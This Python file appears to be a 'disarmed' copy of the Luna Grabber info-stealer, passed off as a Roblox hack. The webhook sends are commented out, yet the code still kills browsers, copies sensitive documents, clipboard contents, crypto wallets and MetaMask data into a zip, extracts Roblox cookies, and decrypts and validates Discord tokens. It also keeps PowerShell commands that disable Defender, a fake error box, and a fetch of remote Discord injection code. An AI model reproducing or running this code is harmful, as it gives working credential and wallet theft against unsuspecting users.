# https://github.com/bathwaterman/Roblox-Hacks <- the current disarmed one was got from here
# https://github.com/thepoff1327/roblox-account-hacker <- this will be made later on

""":: You managed to break through BlankOBF v2; Give yourself a pat on your back! ::"""
__CONFIG__ = {
    'webhook': 'fuck you stealler bitches (also was nuked lol)',
    'ping': True,
    'pingtype': 'Here',
    'fakeerror': True,
    'bound_startup': False,
    'defender': True,
    'systeminfo': True,
    'common_files': True,
    'roblox': True,
    'obfuscation': True,
    'injection': True,
    'antidebug_vm': False,
    'discord': True,
    'anti_spam': False,
    'self_destruct': False,
    'clipboard': True,
    'games': True,
    'screenshot': True,
    'mutex': 'Mrgfr0EWLMngv9om',
    'wallets': True,
    'browser': False
}

import requests # all code used this lib is inspected.

from zipfile import ZIP_DEFLATED, ZipFile
from win32crypt import CryptUnprotectData
from multiprocessing import cpu_count
from shutil import copytree, rmtree
from Cryptodome.Cipher import AES
import concurrent.futures
from PIL import ImageGrab
import browser_cookie3
import subprocess
import pyperclip
import pycountry
import base64
import ctypes
import psutil
import shutil
import winreg
import random
import zlib
import json
import sys
import os
import re

temp = os.getenv('temp')
temp_path = os.path.join(temp, "stealer_stole_these_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10)))
os.mkdir(temp_path)
print(f"[INFO] Temporary directory created at: {temp_path}")
localappdata = os.getenv('localappdata')
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))

def main(webhook: str):
    threads = []
    if __CONFIG__['fakeerror']:
        threads.append(Fakeerror)
    if __CONFIG__['defender']:
        threads.append(Defender)
    if __CONFIG__['common_files']:
        threads.append(CommonFiles)
    if __CONFIG__['clipboard']:
        threads.append(Clipboard)
    if __CONFIG__['wallets']:
        threads.append(steal_wallets)
    if __CONFIG__['games']:
        threads.append(Games)
    if __CONFIG__['browser'] or __CONFIG__['roblox']:
        browser_exe = ['chrome.exe', 'firefox.exe', 'brave.exe', 'opera.exe', 'kometa.exe', 'orbitum.exe', 'centbrowser.exe', '7star.exe', 'sputnik.exe', 'vivaldi.exe', 'epicprivacybrowser.exe', 'msedge.exe', 'uran.exe','yandex.exe', 'iridium.exe']
        browsers_found = []
        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in browser_exe:
                browsers_found.append(proc)
        for proc in browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
    for func in threads:
        try:
            print(f"[DEBUG] Running: {func.__name__ if hasattr(func, '__name__') else func.__class__.__name__}")
            func()
            print(f"[DEBUG] Finished: {func.__name__ if hasattr(func, '__name__') else func.__class__.__name__}")
        except Exception as e:
            print(f"[ERROR] {func.__name__ if hasattr(func, '__name__') else func.__class__.__name__} failed: {e}")
    max_archive_size = 1024 * 1024 * 25
    current_archive_size = 0
    _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
    with ZipFile(_zipfile, 'w', ZIP_DEFLATED) as zipped_file:
        for dirname, _, files in os.walk(temp_path):
            for filename in files:
                absname = os.path.join(dirname, filename)
                arcname = os.path.relpath(absname, temp_path)
                file_size = os.path.getsize(absname)
                if current_archive_size + file_size <= max_archive_size:
                    zipped_file.write(absname, arcname)
                    current_archive_size += file_size
                else:
                    break
    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
    if __CONFIG__['ping']:
        if __CONFIG__['pingtype'] in ['Everyone', 'Here']:
            content = f"@{__CONFIG__['pingtype'].lower()}"
    if __CONFIG__['systeminfo']:
        PcInfo()
    if __CONFIG__['discord']:
        Discord()
    if __CONFIG__['roblox']:
        Roblox()
    if __CONFIG__['screenshot']:
        Screenshot()
    print(_file)
    print("\n[DISARMED] This is what would have been stolen. Be careful! See the zip file at:", _file)
    print("[DISARMED] No data has been sent anywhere. This script is now safe to run for educational purposes only.")
    return

def Luna(webhook: str):
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.argv[0], True)
        else:
            return (__file__, False)
    def ExcludeFromDefender(path) -> None:
        if __CONFIG__['defender']:
            subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    def IsConnectedToInternet() -> bool:
        try:
            return requests.get('https://gstatic.com/generate_204').status_code == 204
        except Exception:
            return False
    if not IsConnectedToInternet():
        if not __CONFIG__['startup']:
            os._exit(0)
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183
    if not CreateMutex(__CONFIG__['mutex']):
        os._exit(0)
    path, isExecutable = GetSelf()
    inStartup = os.path.basename(os.path.dirname(path)).lower() == 'startup'
    if isExecutable and (__CONFIG__['bound_startup'] or not inStartup) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.luna'))):
        if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
            os.remove(boundFileDst)
        with open(boundFileSrc, 'rb') as f:
            content = f.read()
        decrypted = zlib.decompress(content[::-1])
        with open(boundFileDst, 'wb') as f:
            f.write(decrypted)
        del content, decrypted
        ExcludeFromDefender(boundFileDst)
        subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    with concurrent.futures.ThreadPoolExecutor() as executor:
        if __CONFIG__['injection']:
            executor.submit(Injection, webhook)
        executor.submit(main, webhook)

# --- Add debug prints to CommonFiles ---
class CommonFiles:
    def __init__(self):
        print("[DEBUG] CommonFiles started")
        self.zipfile = os.path.join(temp_path, f'Common-Files-{os.getlogin()}.zip')
        self.steal_common_files()
        print("[DEBUG] CommonFiles finished")
    def steal_common_files(self) -> None:
        found = False
        def _get_user_folder_path(folder_name):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders') as key:
                    value, _ = winreg.QueryValueEx(key, folder_name)
                    return value
            except FileNotFoundError:
                return None
        paths = [_get_user_folder_path('Desktop'), _get_user_folder_path('Personal'), _get_user_folder_path('{374DE290-123F-4565-9164-39C4925E467B}')]
        for search_path in paths:
            if os.path.isdir(search_path):
                entry: str
                for entry in os.listdir(search_path):
                    if os.path.isfile(os.path.join(search_path, entry)):
                        if (any([x in entry.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or entry.endswith(('.txt', '.rtf', '.odt', '.doc', '.docx', '.pdf', '.csv', '.xls', '.xlsx,', '.ods', '.json', '.ppk'))) and (not entry.endswith('.lnk')) and (0 < os.path.getsize(os.path.join(search_path, entry)) < 2 * 1024 * 1024):
                            try:
                                os.makedirs(os.path.join(temp_path, 'Common Files'), exist_ok=True)
                                shutil.copy(os.path.join(search_path, entry), os.path.join(temp_path, 'Common Files', entry))
                                found = True
                            except Exception:
                                pass
                    elif os.path.isdir(os.path.join(search_path, entry)) and (not entry == 'Common Files'):
                        for sub_entry in os.listdir(os.path.join(search_path, entry)):
                            if os.path.isfile(os.path.join(search_path, entry, sub_entry)):
                                if (any([x in sub_entry.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or sub_entry.endswith(('.txt', '.rtf', '.odt', '.doc', '.docx', '.pdf', '.csv', '.xls', '.xlsx,', '.ods', '.json', '.ppk'))) and (not entry.endswith('.lnk')) and (0 < os.path.getsize(os.path.join(search_path, entry, sub_entry)) < 2 * 1024 * 1024):
                                    try:
                                        os.makedirs(os.path.join(temp_path, 'Common Files', entry), exist_ok=True)
                                        shutil.copy(os.path.join(search_path, entry, sub_entry), os.path.join(temp_path, 'Common Files', entry))
                                        found = True
                                    except Exception:
                                        pass
        if not found:
            print("[DEBUG] CommonFiles: No files found to copy.")

class Roblox:
    def __init__(self):
        self.roblox_cookies = {}
        self.grab_roblox_cookies()
        self.send_info()
    def grab_roblox_cookies(self):
        browsers = [('Chrome', browser_cookie3.chrome), ('Edge', browser_cookie3.edge), ('Firefox', browser_cookie3.firefox), ('Safari', browser_cookie3.safari), ('Opera', browser_cookie3.opera), ('Brave', browser_cookie3.brave), ('Vivaldi', browser_cookie3.vivaldi)]
        for browser_name, browser in browsers:
            try:
                browser_cookies = browser(domain_name='roblox.com')
                for cookie in browser_cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        self.roblox_cookies[browser_name] = cookie.value
            except Exception:
                pass
    def send_info(self):
        for roblox_cookie in self.roblox_cookies.values():
            headers = {'Cookie': '.ROBLOSECURITY=' + roblox_cookie}
            info = None
            try:
                response = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers)
                response.raise_for_status()
                info = response.json()
            except Exception:
                pass
            first_cookie_half = roblox_cookie[:len(roblox_cookie) // 2]
            second_cookie_half = roblox_cookie[len(roblox_cookie) // 2:]
            if info is not None:
                data = {'embeds': [{'title': 'Roblox Info', 'color': 5639644, 'fields': [{'name': 'Name:', 'value': f"`DISARMED`", 'inline': True}, {'name': '<:robux_coin:1041813572407283842> Robux:', 'value': f"`DISARMED`", 'inline': True}, {'name': ':cookie: Cookie:', 'value': f'`{first_cookie_half}`', 'inline': False}, {'name': '', 'value': f'`{second_cookie_half}`', 'inline': False}], 'thumbnail': {'url': 'DISARMED'}, 'footer': {'text': 'Luna Grabber | Created By Smug'}}], 'username': 'Luna', 'avatar_url': 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'}
                print("[DISARMED] Would have sent the following Roblox info to the attacker:")
                print(json.dumps(data, indent=4))

class Clipboard:
    def __init__(self):
        print("[DEBUG] Clipboard started")
        self.directory = os.path.join(temp_path, 'Clipboard')
        os.makedirs(self.directory, exist_ok=True)
        self.get_clipboard()
        print("[DEBUG] Clipboard finished")
    def get_clipboard(self):
        content = pyperclip.paste()
        if content:
            with open(os.path.join(self.directory, 'clipboard.txt'), 'w', encoding='utf-8') as file:
                file.write(content)
        else:
            with open(os.path.join(self.directory, 'clipboard.txt'), 'w', encoding='utf-8') as file:
                file.write('Clipboard is empty')
            print("[DEBUG] Clipboard: Clipboard is empty.")

class Defender:
    def __init__(self):
        self.disable()
        self.exclude()
    def disable(self):
        # cmd = 'powershell.exe Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2'
        # subprocess.run(cmd, shell=True, capture_output=True)
        print("[DISARMED] Would have disabled Windows Defender here.")
    def exclude(self):
        # cmd = 'powershell.exe -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath %USERPROFILE%\\AppData" & powershell.exe -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath %USERPROFILE%\\Local" & powershell.exe -command "Set-MpPreference -ExclusionExtension \'.exe\',\'.py\'"'
        # subprocess.run(cmd, shell=True, capture_output=True)
        print("[DISARMED] Would have added Defender exclusions here.")


class Discord:
    def __init__(self):
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.regex = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.encrypted_regex = 'dQw4w9WgXcQ:[^\\"]*'
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()
        self.upload(__CONFIG__['webhook'])
    def killprotector(self):
        path = f'{self.roaming}\\DiscordTokenProtector'
        config = path + 'config.json'
        if not os.path.exists(path):
            return
        for process in ['\\DiscordTokenProtector.exe', '\\ProtectionPayload.dll', '\\secure.dat']:
            try:
                # os.remove(path + process)
                print(f"[DISARMED] Would have deleted {path + process}")
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            before = None
            after = None
            with open(config, errors='ignore') as f:
                try:
                    before = json.load(f)
                except json.decoder.JSONDecodeError:
                    print(f"[DISARMED] {config} is not valid JSON, cannot show before/after diff.")
                    return
                after = before.copy()
                after['auto_start'] = False
                after['auto_start_discord'] = False
                after['integrity'] = False
                after['integrity_allowbetterdiscord'] = False
                after['integrity_checkexecutable'] = False
                after['integrity_checkhash'] = False
                after['integrity_checkmodule'] = False
                after['integrity_checkscripts'] = False
                after['integrity_checkresource'] = False
                after['integrity_redownloadhashes'] = False
                after['iterations_iv'] = 364
                after['iterations_key'] = 457
                after['version'] = 69420
            print(f"[DISARMED] Would have modified {config} with the following changes:")
            for key in after:
                before_val = before.get(key, '[NOT PRESENT]')
                after_val = after[key]
                if before_val != after_val:
                    print(f"  - {key}: {before_val} -> {after_val}")
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return 'Failed to decrypt password'
    def get_master_key(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def grabTokens(self):
        paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\', 'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\', 'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\', 'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\', 'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\', 'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\', 'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\', 'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\', 'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\', 'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\', 'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\', 'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'}
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(' ', '').lower()
            if 'cord' in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ['log', 'ldb']:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ['log', 'ldb']:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            val = ''
            methods = ''
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token}
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
            username = user['username']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']
            mfa = ':white_check_mark:' if user.get('mfa_enabled') else ':x:'
            premium_types = {0: ':x:', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
            nitro = premium_types.get(user.get('premium_type'), ':x:')
            if 'message' in payment or payment == []:
                methods = ':x:'
            else:
                methods = ''.join(['💳' if method['type'] == 1 else '<:paypal:973417655627288666>' if method['type'] == 2 else ':question:' for method in payment])
            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
            data = {'embeds': [{'title': f'{username}', 'color': 5639644, 'fields': [{'name': 'Discord Info', 'value': val}], 'thumbnail': {'url': avatar_url}, 'footer': {'text': 'Luna Grabber | Created By Smug'}}], 'username': 'Luna', 'avatar_url': 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'}
            print("[DISARMED] Would have sent the following Discord info to the attacker:")
            print(json.dumps(data, indent=4))
            self.tokens_sent.append(token)

class Fakeerror:

    def __init__(self):
        self.startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        self.fakeerror()

    def GetSelf(self) -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.argv[0], True)
        else:
            return (__file__, False)

    def fakeerror(self):
        path, _ = self.GetSelf()
        source_path = os.path.abspath(path)
        if os.path.basename(os.path.dirname(source_path)).lower() == 'startup':
            return
        ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)

class Injection:

    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [self.appdata + '\\Discord', self.appdata + '\\DiscordCanary', self.appdata + '\\DiscordPTB', self.appdata + '\\DiscordDevelopment']
        # response = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js')
        # if response.status_code != 200:
        #     return
        # self.code = response.text
        self.code = "[DISARMED] Injection code would have been here."
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                # proc.kill()
                print(f"[DISARMED] Would have killed process: {proc.name()}")
        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue
            if self.get_core(dir) is not None:
                # with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                #     f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                #     self.start_discord(dir)
                print(f"[DISARMED] Would have written injection code to {self.get_core(dir)[0]}\\index.js and restarted Discord.")

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search('discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return (core, file)

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

class PcInfo:
    def __init__(self):
        self.avatar = 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'
        self.username = 'Luna'
        self.get_system_info(__CONFIG__['webhook'])
    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return 'white'

    def get_all_avs(self) -> str:
        process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
        if process.returncode == 0:
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
            if len(output) >= 2:
                output = output[1:]
                output = [av.strip() for av in output]
                return ', '.join(output)

    def get_system_info(self, webhook):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(['wmic', 'cpu', 'get', 'Name'], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1024 ** 3))
        username = os.getenv('UserName')
        hostname = os.getenv('COMPUTERNAME')
        uuid = subprocess.check_output('C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        product_key = subprocess.run('wmic path softwarelicensingservice get OA3xOriginalProductKey', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run('wmic path softwarelicensingservice get OA3xOriginalProductKey', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != '' else 'Failed to get product key'
        try:
            r: dict = requests.get('http://ip-api.com/json/?fields=225545').json()
            if r['status'] != 'success':
                raise Exception('Failed')
            country = r['country']
            proxy = r['proxy']
            ip = r['query']
        except Exception:
            country = 'Failed to get country'
            proxy = 'Failed to get proxy'
            ip = 'Failed to get IP'
        _, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address
        data = {'embeds': [{'title': 'Luna Logger', 'color': 5639644, 'fields': [{'name': 'System Info', 'value': f":computer: **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n:globe_with_meridians: **OS:** `{computer_os}`\n<:windows:1239719032849174568> **Product Key:** `{product_key}`\n\n:eyes: **IP:** `{ip}`\n:flag_{self.get_country_code(country)}: **Country:** `{country}`\n{(':shield:' if proxy else ':x:')} **Proxy:** `{proxy}`\n:green_apple: **MAC:** `{mac}`\n:wrench: **UUID:** `{uuid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n\n:cop: **Antivirus:** `{self.get_all_avs()}`\n"}], 'footer': {'text': 'Luna Grabber | Created By Smug'}, 'thumbnail': {'url': self.avatar}}], 'username': self.username, 'avatar_url': self.avatar}
        # requests.post(webhook, json=data)
        print("[DISARMED] Would have sent the following system info to the attacker:")
        print(json.dumps(data, indent=4))

# --- Add debug prints to steal_wallets ---
def steal_wallets():
    print("[DEBUG] steal_wallets started")
    wallet_path = os.path.join(temp_path, 'Wallets')
    os.makedirs(wallet_path, exist_ok=True)
    wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
    browser_paths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
    found = False
    for name, path in wallets:
        if os.path.isdir(path):
            named_wallet_path = os.path.join(wallet_path, name)
            os.makedirs(named_wallet_path, exist_ok=True)
            try:
                if path != named_wallet_path:
                    copytree(path, os.path.join(named_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
                    found = True
            except Exception:
                pass
    for name, path in browser_paths.items():
        if os.path.isdir(path):
            for root, dirs, _ in os.walk(path):
                for dir_name in dirs:
                    if dir_name == 'Local Extension Settings':
                        local_extensions_settings_dir = os.path.join(root, dir_name)
                        for ext_dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                            ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                            metamask_browser = os.path.join(wallet_path, 'Metamask ({})'.format(name))
                            named_wallet_path = os.path.join(metamask_browser, ext_dir)
                            if os.path.isdir(ext_path) and os.listdir(ext_path):
                                try:
                                    copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
                                    found = True
                                except Exception:
                                    pass
                                else:
                                    if not os.listdir(metamask_browser):
                                        rmtree(metamask_browser)
    if not found:
        print("[DEBUG] steal_wallets: No wallets or browser extensions found.")
    print("[DEBUG] steal_wallets finished")

class Games:
    def __init__(self):
        print("[DEBUG] Games started")
        self.StealEpic()
